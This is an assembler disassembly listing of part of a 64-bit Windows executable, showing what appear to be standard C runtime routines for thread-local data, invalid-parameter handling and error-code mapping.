   140006406:	e8 f5 3a 00 00       	call   0x140009f00
   14000640b:	33 c9                	xor    %ecx,%ecx
   14000640d:	e8 3a 08 00 00       	call   0x140006c4c
   140006412:	eb ce                	jmp    0x1400063e2
   140006414:	48 8b d7             	mov    %rdi,%rdx
   140006417:	e8 e4 3a 00 00       	call   0x140009f00
   14000641c:	85 c0                	test   %eax,%eax
   14000641e:	75 12                	jne    0x140006432
   140006420:	8b 0d 6a 3c 01 00    	mov    0x13c6a(%rip),%ecx        # 0x14001a090
   140006426:	33 d2                	xor    %edx,%edx
   140006428:	e8 d3 3a 00 00       	call   0x140009f00
   14000642d:	48 8b cf             	mov    %rdi,%rcx
   140006430:	eb db                	jmp    0x14000640d
   140006432:	48 8b cf             	mov    %rdi,%rcx
   140006435:	e8 0a fd ff ff       	call   0x140006144
   14000643a:	33 c9                	xor    %ecx,%ecx
   14000643c:	e8 0b 08 00 00       	call   0x140006c4c
   140006441:	8b cb                	mov    %ebx,%ecx
   140006443:	ff 15 97 9c 00 00    	call   *0x9c97(%rip)        # 0x1400100e0
   140006449:	48 85 ff             	test   %rdi,%rdi
   14000644c:	74 13                	je     0x140006461
   14000644e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006453:	48 8b c7             	mov    %rdi,%rax
   140006456:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000645b:	48 83 c4 20          	add    $0x20,%rsp
   14000645f:	5f                   	pop    %rdi
   140006460:	c3                   	ret
   140006461:	e8 aa f9 ff ff       	call   0x140005e10
   140006466:	cc                   	int3
   140006467:	cc                   	int3
   140006468:	40 53                	rex push %rbx
   14000646a:	48 83 ec 20          	sub    $0x20,%rsp
   14000646e:	8b 0d 1c 3c 01 00    	mov    0x13c1c(%rip),%ecx        # 0x14001a090
   140006474:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140006477:	74 1b                	je     0x140006494
   140006479:	e8 7a 3a 00 00       	call   0x140009ef8
   14000647e:	48 8b d8             	mov    %rax,%rbx
   140006481:	48 85 c0             	test   %rax,%rax
   140006484:	74 08                	je     0x14000648e
   140006486:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000648a:	74 78                	je     0x140006504
   14000648c:	eb 6d                	jmp    0x1400064fb
   14000648e:	8b 0d fc 3b 01 00    	mov    0x13bfc(%rip),%ecx        # 0x14001a090
   140006494:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140006498:	e8 63 3a 00 00       	call   0x140009f00
   14000649d:	85 c0                	test   %eax,%eax
   14000649f:	74 63                	je     0x140006504
   1400064a1:	ba c8 03 00 00       	mov    $0x3c8,%edx
   1400064a6:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400064ab:	e8 24 07 00 00       	call   0x140006bd4
   1400064b0:	8b 0d da 3b 01 00    	mov    0x13bda(%rip),%ecx        # 0x14001a090
   1400064b6:	48 8b d8             	mov    %rax,%rbx
   1400064b9:	48 85 c0             	test   %rax,%rax
   1400064bc:	75 10                	jne    0x1400064ce
   1400064be:	33 d2                	xor    %edx,%edx
   1400064c0:	e8 3b 3a 00 00       	call   0x140009f00
   1400064c5:	33 c9                	xor    %ecx,%ecx
   1400064c7:	e8 80 07 00 00       	call   0x140006c4c
   1400064cc:	eb 36                	jmp    0x140006504
   1400064ce:	48 8b d3             	mov    %rbx,%rdx
   1400064d1:	e8 2a 3a 00 00       	call   0x140009f00
   1400064d6:	85 c0                	test   %eax,%eax
   1400064d8:	75 12                	jne    0x1400064ec
   1400064da:	8b 0d b0 3b 01 00    	mov    0x13bb0(%rip),%ecx        # 0x14001a090
   1400064e0:	33 d2                	xor    %edx,%edx
   1400064e2:	e8 19 3a 00 00       	call   0x140009f00
   1400064e7:	48 8b cb             	mov    %rbx,%rcx
   1400064ea:	eb db                	jmp    0x1400064c7
   1400064ec:	48 8b cb             	mov    %rbx,%rcx
   1400064ef:	e8 50 fc ff ff       	call   0x140006144
   1400064f4:	33 c9                	xor    %ecx,%ecx
   1400064f6:	e8 51 07 00 00       	call   0x140006c4c
   1400064fb:	48 8b c3             	mov    %rbx,%rax
   1400064fe:	48 83 c4 20          	add    $0x20,%rsp
   140006502:	5b                   	pop    %rbx
   140006503:	c3                   	ret
   140006504:	e8 07 f9 ff ff       	call   0x140005e10
   140006509:	cc                   	int3
   14000650a:	cc                   	int3
   14000650b:	cc                   	int3
   14000650c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006511:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006516:	57                   	push   %rdi
   140006517:	48 83 ec 20          	sub    $0x20,%rsp
   14000651b:	ff 15 b7 9b 00 00    	call   *0x9bb7(%rip)        # 0x1400100d8
   140006521:	8b 0d 69 3b 01 00    	mov    0x13b69(%rip),%ecx        # 0x14001a090
   140006527:	33 f6                	xor    %esi,%esi
   140006529:	8b d8                	mov    %eax,%ebx
   14000652b:	83 f9 ff             	cmp    $0xffffffff,%ecx
   14000652e:	74 1d                	je     0x14000654d
   140006530:	e8 c3 39 00 00       	call   0x140009ef8
   140006535:	48 8b f8             	mov    %rax,%rdi
   140006538:	48 85 c0             	test   %rax,%rax
   14000653b:	74 0a                	je     0x140006547
   14000653d:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140006541:	48 0f 44 fe          	cmove  %rsi,%rdi
   140006545:	eb 72                	jmp    0x1400065b9
   140006547:	8b 0d 43 3b 01 00    	mov    0x13b43(%rip),%ecx        # 0x14001a090
   14000654d:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140006551:	e8 aa 39 00 00       	call   0x140009f00
   140006556:	85 c0                	test   %eax,%eax
   140006558:	75 05                	jne    0x14000655f
   14000655a:	48 8b fe             	mov    %rsi,%rdi
   14000655d:	eb 5a                	jmp    0x1400065b9
   14000655f:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140006564:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006569:	e8 66 06 00 00       	call   0x140006bd4
   14000656e:	8b 0d 1c 3b 01 00    	mov    0x13b1c(%rip),%ecx        # 0x14001a090
   140006574:	48 8b f8             	mov    %rax,%rdi
   140006577:	48 85 c0             	test   %rax,%rax
   14000657a:	75 10                	jne    0x14000658c
   14000657c:	33 d2                	xor    %edx,%edx
   14000657e:	e8 7d 39 00 00       	call   0x140009f00
   140006583:	33 c9                	xor    %ecx,%ecx
   140006585:	e8 c2 06 00 00       	call   0x140006c4c
   14000658a:	eb ce                	jmp    0x14000655a
   14000658c:	48 8b d7             	mov    %rdi,%rdx
   14000658f:	e8 6c 39 00 00       	call   0x140009f00
   140006594:	85 c0                	test   %eax,%eax
   140006596:	75 12                	jne    0x1400065aa
   140006598:	8b 0d f2 3a 01 00    	mov    0x13af2(%rip),%ecx        # 0x14001a090
   14000659e:	33 d2                	xor    %edx,%edx
   1400065a0:	e8 5b 39 00 00       	call   0x140009f00
   1400065a5:	48 8b cf             	mov    %rdi,%rcx
   1400065a8:	eb db                	jmp    0x140006585
   1400065aa:	48 8b cf             	mov    %rdi,%rcx
   1400065ad:	e8 92 fb ff ff       	call   0x140006144
   1400065b2:	33 c9                	xor    %ecx,%ecx
   1400065b4:	e8 93 06 00 00       	call   0x140006c4c
   1400065b9:	8b cb                	mov    %ebx,%ecx
   1400065bb:	ff 15 1f 9b 00 00    	call   *0x9b1f(%rip)        # 0x1400100e0
   1400065c1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400065c6:	48 8b c7             	mov    %rdi,%rax
   1400065c9:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400065ce:	48 83 c4 20          	add    $0x20,%rsp
   1400065d2:	5f                   	pop    %rdi
   1400065d3:	c3                   	ret
   1400065d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400065d9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400065de:	57                   	push   %rdi
   1400065df:	48 83 ec 20          	sub    $0x20,%rsp
   1400065e3:	8b 0d a7 3a 01 00    	mov    0x13aa7(%rip),%ecx        # 0x14001a090
   1400065e9:	33 db                	xor    %ebx,%ebx
   1400065eb:	48 8b f2             	mov    %rdx,%rsi
   1400065ee:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400065f1:	74 1b                	je     0x14000660e
   1400065f3:	e8 00 39 00 00       	call   0x140009ef8
   1400065f8:	48 8b f8             	mov    %rax,%rdi
   1400065fb:	48 85 c0             	test   %rax,%rax
   1400065fe:	74 08                	je     0x140006608
   140006600:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140006604:	74 79                	je     0x14000667f
   140006606:	eb 6d                	jmp    0x140006675
   140006608:	8b 0d 82 3a 01 00    	mov    0x13a82(%rip),%ecx        # 0x14001a090
   14000660e:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140006612:	e8 e9 38 00 00       	call   0x140009f00
   140006617:	85 c0                	test   %eax,%eax
   140006619:	74 64                	je     0x14000667f
   14000661b:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140006620:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006625:	e8 aa 05 00 00       	call   0x140006bd4
   14000662a:	8b 0d 60 3a 01 00    	mov    0x13a60(%rip),%ecx        # 0x14001a090
   140006630:	48 8b f8             	mov    %rax,%rdi
   140006633:	48 85 c0             	test   %rax,%rax
   140006636:	75 10                	jne    0x140006648
   140006638:	33 d2                	xor    %edx,%edx
   14000663a:	e8 c1 38 00 00       	call   0x140009f00
   14000663f:	33 c9                	xor    %ecx,%ecx
   140006641:	e8 06 06 00 00       	call   0x140006c4c
   140006646:	eb 37                	jmp    0x14000667f
   140006648:	48 8b d7             	mov    %rdi,%rdx
   14000664b:	e8 b0 38 00 00       	call   0x140009f00
   140006650:	85 c0                	test   %eax,%eax
   140006652:	75 12                	jne    0x140006666
   140006654:	8b 0d 36 3a 01 00    	mov    0x13a36(%rip),%ecx        # 0x14001a090
   14000665a:	33 d2                	xor    %edx,%edx
   14000665c:	e8 9f 38 00 00       	call   0x140009f00
   140006661:	48 8b cf             	mov    %rdi,%rcx
   140006664:	eb db                	jmp    0x140006641
   140006666:	48 8b cf             	mov    %rdi,%rcx
   140006669:	e8 d6 fa ff ff       	call   0x140006144
   14000666e:	33 c9                	xor    %ecx,%ecx
   140006670:	e8 d7 05 00 00       	call   0x140006c4c
   140006675:	48 69 de c8 03 00 00 	imul   $0x3c8,%rsi,%rbx
   14000667c:	48 03 df             	add    %rdi,%rbx
   14000667f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006684:	48 8b c3             	mov    %rbx,%rax
   140006687:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000668c:	48 83 c4 20          	add    $0x20,%rsp
   140006690:	5f                   	pop    %rdi
   140006691:	c3                   	ret
   140006692:	cc                   	int3
   140006693:	cc                   	int3
   140006694:	48 83 ec 28          	sub    $0x28,%rsp
   140006698:	48 8d 0d 75 fb ff ff 	lea    -0x48b(%rip),%rcx        # 0x140006214
   14000669f:	e8 44 38 00 00       	call   0x140009ee8
   1400066a4:	89 05 e6 39 01 00    	mov    %eax,0x139e6(%rip)        # 0x14001a090
   1400066aa:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400066ad:	75 04                	jne    0x1400066b3
   1400066af:	32 c0                	xor    %al,%al
   1400066b1:	eb 15                	jmp    0x1400066c8
   1400066b3:	e8 54 fe ff ff       	call   0x14000650c
   1400066b8:	48 85 c0             	test   %rax,%rax
   1400066bb:	75 09                	jne    0x1400066c6
   1400066bd:	33 c9                	xor    %ecx,%ecx
   1400066bf:	e8 0c 00 00 00       	call   0x1400066d0
   1400066c4:	eb e9                	jmp    0x1400066af
   1400066c6:	b0 01                	mov    $0x1,%al
   1400066c8:	48 83 c4 28          	add    $0x28,%rsp
   1400066cc:	c3                   	ret
   1400066cd:	cc                   	int3
   1400066ce:	cc                   	int3
   1400066cf:	cc                   	int3
   1400066d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400066d4:	8b 0d b6 39 01 00    	mov    0x139b6(%rip),%ecx        # 0x14001a090
   1400066da:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400066dd:	74 0c                	je     0x1400066eb
   1400066df:	e8 0c 38 00 00       	call   0x140009ef0
   1400066e4:	83 0d a5 39 01 00 ff 	orl    $0xffffffff,0x139a5(%rip)        # 0x14001a090
   1400066eb:	b0 01                	mov    $0x1,%al
   1400066ed:	48 83 c4 28          	add    $0x28,%rsp
   1400066f1:	c3                   	ret
   1400066f2:	cc                   	int3
   1400066f3:	cc                   	int3
   1400066f4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400066f9:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400066fe:	57                   	push   %rdi
   1400066ff:	48 83 ec 20          	sub    $0x20,%rsp
   140006703:	48 8b 31             	mov    (%rcx),%rsi
   140006706:	33 ff                	xor    %edi,%edi
   140006708:	48 8b d9             	mov    %rcx,%rbx
   14000670b:	48 85 f6             	test   %rsi,%rsi
   14000670e:	75 3b                	jne    0x14000674b
   140006710:	ff 15 c2 99 00 00    	call   *0x99c2(%rip)        # 0x1400100d8
   140006716:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000671a:	40 38 7b 10          	cmp    %dil,0x10(%rbx)
   14000671e:	75 0a                	jne    0x14000672a
   140006720:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   140006724:	c6 43 10 01          	movb   $0x1,0x10(%rbx)
   140006728:	eb 04                	jmp    0x14000672e
   14000672a:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
   14000672e:	48 8b d7             	mov    %rdi,%rdx
   140006731:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006736:	e8 99 fe ff ff       	call   0x1400065d4
   14000673b:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000673f:	48 8b f0             	mov    %rax,%rsi
   140006742:	48 89 03             	mov    %rax,(%rbx)
   140006745:	ff 15 95 99 00 00    	call   *0x9995(%rip)        # 0x1400100e0
   14000674b:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006750:	48 8b c6             	mov    %rsi,%rax
   140006753:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006758:	48 83 c4 20          	add    $0x20,%rsp
   14000675c:	5f                   	pop    %rdi
   14000675d:	c3                   	ret
   14000675e:	cc                   	int3
   14000675f:	cc                   	int3
   140006760:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006765:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000676a:	57                   	push   %rdi
   14000676b:	48 83 ec 20          	sub    $0x20,%rsp
   14000676f:	33 db                	xor    %ebx,%ebx
   140006771:	48 8b fa             	mov    %rdx,%rdi
   140006774:	48 8b f1             	mov    %rcx,%rsi
   140006777:	38 5a 10             	cmp    %bl,0x10(%rdx)
   14000677a:	75 18                	jne    0x140006794
   14000677c:	ff 15 56 99 00 00    	call   *0x9956(%rip)        # 0x1400100d8
   140006782:	8b c8                	mov    %eax,%ecx
   140006784:	48 89 5f 08          	mov    %rbx,0x8(%rdi)
   140006788:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   14000678c:	ff 15 4e 99 00 00    	call   *0x994e(%rip)        # 0x1400100e0
   140006792:	eb 04                	jmp    0x140006798
   140006794:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   140006798:	48 8d 04 de          	lea    (%rsi,%rbx,8),%rax
   14000679c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400067a1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400067a6:	48 83 c4 20          	add    $0x20,%rsp
   1400067aa:	5f                   	pop    %rdi
   1400067ab:	c3                   	ret
   1400067ac:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400067b1:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400067b6:	55                   	push   %rbp
   1400067b7:	57                   	push   %rdi
   1400067b8:	41 56                	push   %r14
   1400067ba:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   1400067c1:	ff 
   1400067c2:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   1400067c9:	48 8b 05 30 38 01 00 	mov    0x13830(%rip),%rax        # 0x14001a000
   1400067d0:	48 33 c4             	xor    %rsp,%rax
   1400067d3:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   1400067da:	41 8b f8             	mov    %r8d,%edi
   1400067dd:	8b f2                	mov    %edx,%esi
   1400067df:	8b d9                	mov    %ecx,%ebx
   1400067e1:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400067e4:	74 05                	je     0x1400067eb
   1400067e6:	e8 09 b4 ff ff       	call   0x140001bf4
   1400067eb:	33 d2                	xor    %edx,%edx
   1400067ed:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400067f2:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400067f8:	e8 73 87 00 00       	call   0x14000ef70
   1400067fd:	33 d2                	xor    %edx,%edx
   1400067ff:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140006803:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140006809:	e8 62 87 00 00       	call   0x14000ef70
   14000680e:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140006813:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140006818:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000681c:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140006820:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140006825:	ff 15 25 98 00 00    	call   *0x9825(%rip)        # 0x140010050
   14000682b:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   140006832:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140006837:	49 8b ce             	mov    %r14,%rcx
   14000683a:	45 33 c0             	xor    %r8d,%r8d
   14000683d:	ff 15 15 98 00 00    	call   *0x9815(%rip)        # 0x140010058
   140006843:	48 85 c0             	test   %rax,%rax
   140006846:	74 36                	je     0x14000687e
   140006848:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000684e:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140006853:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140006858:	4c 8b c8             	mov    %rax,%r9
   14000685b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140006860:	4d 8b c6             	mov    %r14,%r8
   140006863:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140006868:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000686d:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140006871:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140006876:	33 c9                	xor    %ecx,%ecx
   140006878:	ff 15 e2 97 00 00    	call   *0x97e2(%rip)        # 0x140010060
   14000687e:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140006885:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   14000688c:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   140006893:	48 83 c0 08          	add    $0x8,%rax
   140006897:	89 74 24 70          	mov    %esi,0x70(%rsp)
   14000689b:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   1400068a2:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   1400068a9:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   1400068ad:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   1400068b1:	ff 15 01 98 00 00    	call   *0x9801(%rip)        # 0x1400100b8
   1400068b7:	33 c9                	xor    %ecx,%ecx
   1400068b9:	8b f8                	mov    %eax,%edi
   1400068bb:	ff 15 af 97 00 00    	call   *0x97af(%rip)        # 0x140010070
   1400068c1:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1400068c6:	ff 15 9c 97 00 00    	call   *0x979c(%rip)        # 0x140010068
   1400068cc:	85 c0                	test   %eax,%eax
   1400068ce:	75 10                	jne    0x1400068e0
   1400068d0:	85 ff                	test   %edi,%edi
   1400068d2:	75 0c                	jne    0x1400068e0
   1400068d4:	83 fb ff             	cmp    $0xffffffff,%ebx
   1400068d7:	74 07                	je     0x1400068e0
   1400068d9:	8b cb                	mov    %ebx,%ecx
   1400068db:	e8 14 b3 ff ff       	call   0x140001bf4
   1400068e0:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   1400068e7:	48 33 cc             	xor    %rsp,%rcx
   1400068ea:	e8 71 aa ff ff       	call   0x140001360
   1400068ef:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   1400068f6:	00 
   1400068f7:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1400068fb:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400068ff:	49 8b e3             	mov    %r11,%rsp
   140006902:	41 5e                	pop    %r14
   140006904:	5f                   	pop    %rdi
   140006905:	5d                   	pop    %rbp
   140006906:	c3                   	ret
   140006907:	cc                   	int3
   140006908:	48 89 0d b1 4a 01 00 	mov    %rcx,0x14ab1(%rip)        # 0x14001b3c0
   14000690f:	c3                   	ret
   140006910:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006915:	55                   	push   %rbp
   140006916:	48 8b ec             	mov    %rsp,%rbp
   140006919:	48 83 ec 70          	sub    $0x70,%rsp
   14000691d:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   140006922:	83 3d 57 4a 01 00 00 	cmpl   $0x0,0x14a57(%rip)        # 0x14001b380
   140006929:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   14000692d:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   140006931:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   140006935:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   140006939:	75 10                	jne    0x14000694b
   14000693b:	0f 10 05 f6 3d 01 00 	movups 0x13df6(%rip),%xmm0        # 0x14001a738
   140006942:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   140006946:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   14000694b:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   14000694f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006954:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006958:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000695d:	e8 4a 00 00 00       	call   0x1400069ac
   140006962:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   140006966:	75 0b                	jne    0x140006973
   140006968:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   14000696c:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006973:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   140006977:	74 0f                	je     0x140006988
   140006979:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   14000697c:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140006980:	e8 eb f4 ff ff       	call   0x140005e70
   140006985:	89 58 20             	mov    %ebx,0x20(%rax)
   140006988:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000698c:	74 0f                	je     0x14000699d
   14000698e:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   140006991:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140006995:	e8 d6 f4 ff ff       	call   0x140005e70
   14000699a:	89 58 24             	mov    %ebx,0x24(%rax)
   14000699d:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400069a4:	00 
   1400069a5:	48 83 c4 70          	add    $0x70,%rsp
   1400069a9:	5d                   	pop    %rbp
   1400069aa:	c3                   	ret
   1400069ab:	cc                   	int3
   1400069ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400069b1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400069b6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400069bb:	57                   	push   %rdi
   1400069bc:	48 83 ec 30          	sub    $0x30,%rsp
   1400069c0:	48 8b e9             	mov    %rcx,%rbp
   1400069c3:	41 8b d9             	mov    %r9d,%ebx
   1400069c6:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1400069cb:	49 8b f8             	mov    %r8,%rdi
   1400069ce:	48 8b f2             	mov    %rdx,%rsi
   1400069d1:	e8 1e fd ff ff       	call   0x1400066f4
   1400069d6:	48 85 c0             	test   %rax,%rax
   1400069d9:	74 47                	je     0x140006a22
   1400069db:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   1400069e2:	48 85 c0             	test   %rax,%rax
   1400069e5:	74 3b                	je     0x140006a22
   1400069e7:	49 ba 70 2a 57 34 48 	movabs $0xd6bc1f4834572a70,%r10
   1400069ee:	1f bc d6 
   1400069f1:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400069f6:	48 8b d6             	mov    %rsi,%rdx
   1400069f9:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400069fe:	4c 8b c7             	mov    %rdi,%r8
   140006a01:	48 8b cd             	mov    %rbp,%rcx
   140006a04:	44 8b cb             	mov    %ebx,%r9d
   140006a07:	ff 15 b3 98 00 00    	call   *0x98b3(%rip)        # 0x1400102c0
   140006a0d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006a12:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006a17:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006a1c:	48 83 c4 30          	add    $0x30,%rsp
   140006a20:	5f                   	pop    %rdi
   140006a21:	c3                   	ret
   140006a22:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   140006a27:	48 8d 0d 92 49 01 00 	lea    0x14992(%rip),%rcx        # 0x14001b3c0
   140006a2e:	e8 2d fd ff ff       	call   0x140006760
   140006a33:	4c 8b 18             	mov    (%rax),%r11
   140006a36:	48 8b 05 c3 35 01 00 	mov    0x135c3(%rip),%rax        # 0x14001a000
   140006a3d:	4c 33 d8             	xor    %rax,%r11
   140006a40:	8b c8                	mov    %eax,%ecx
   140006a42:	83 e1 3f             	and    $0x3f,%ecx
   140006a45:	49 d3 cb             	ror    %cl,%r11
   140006a48:	4d 85 db             	test   %r11,%r11
   140006a4b:	74 0f                	je     0x140006a5c
   140006a4d:	49 ba 70 2a 57 34 48 	movabs $0xd6bc1f4834572a70,%r10
   140006a54:	1f bc d6 
   140006a57:	49 8b c3             	mov    %r11,%rax
   140006a5a:	eb 95                	jmp    0x1400069f1
   140006a5c:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140006a61:	44 8b cb             	mov    %ebx,%r9d
   140006a64:	4c 8b c7             	mov    %rdi,%r8
   140006a67:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006a6c:	48 8b d6             	mov    %rsi,%rdx
   140006a6f:	48 8b cd             	mov    %rbp,%rcx
   140006a72:	e8 21 00 00 00       	call   0x140006a98
   140006a77:	cc                   	int3
   140006a78:	48 83 ec 38          	sub    $0x38,%rsp
   140006a7c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006a82:	45 33 c9             	xor    %r9d,%r9d
   140006a85:	45 33 c0             	xor    %r8d,%r8d
   140006a88:	33 d2                	xor    %edx,%edx
   140006a8a:	33 c9                	xor    %ecx,%ecx
   140006a8c:	e8 7f fe ff ff       	call   0x140006910
   140006a91:	48 83 c4 38          	add    $0x38,%rsp
   140006a95:	c3                   	ret
   140006a96:	cc                   	int3
   140006a97:	cc                   	int3
   140006a98:	48 83 ec 28          	sub    $0x28,%rsp
   140006a9c:	b9 17 00 00 00       	mov    $0x17,%ecx
   140006aa1:	ff 15 e1 95 00 00    	call   *0x95e1(%rip)        # 0x140010088
   140006aa7:	85 c0                	test   %eax,%eax
   140006aa9:	74 07                	je     0x140006ab2
   140006aab:	b9 05 00 00 00       	mov    $0x5,%ecx
   140006ab0:	cd 29                	int    $0x29
   140006ab2:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140006ab8:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140006abd:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140006ac1:	e8 e6 fc ff ff       	call   0x1400067ac
   140006ac6:	ff 15 ac 95 00 00    	call   *0x95ac(%rip)        # 0x140010078
   140006acc:	48 8b c8             	mov    %rax,%rcx
   140006acf:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140006ad4:	48 83 c4 28          	add    $0x28,%rsp
   140006ad8:	48 ff 25 a1 95 00 00 	rex.W jmp *0x95a1(%rip)        # 0x140010080
   140006adf:	cc                   	int3
   140006ae0:	33 c0                	xor    %eax,%eax
   140006ae2:	4c 8d 0d 67 ab 00 00 	lea    0xab67(%rip),%r9        # 0x140011650
   140006ae9:	49 8b d1             	mov    %r9,%rdx
   140006aec:	44 8d 40 08          	lea    0x8(%rax),%r8d
   140006af0:	3b 0a                	cmp    (%rdx),%ecx
   140006af2:	74 2b                	je     0x140006b1f
   140006af4:	ff c0                	inc    %eax
   140006af6:	49 03 d0             	add    %r8,%rdx
   140006af9:	83 f8 2d             	cmp    $0x2d,%eax
   140006afc:	72 f2                	jb     0x140006af0
   140006afe:	8d 41 ed             	lea    -0x13(%rcx),%eax
   140006b01:	83 f8 11             	cmp    $0x11,%eax
   140006b04:	77 06                	ja     0x140006b0c
   140006b06:	b8 0d 00 00 00       	mov    $0xd,%eax
   140006b0b:	c3                   	ret
   140006b0c:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   140006b12:	b8 16 00 00 00       	mov    $0x16,%eax
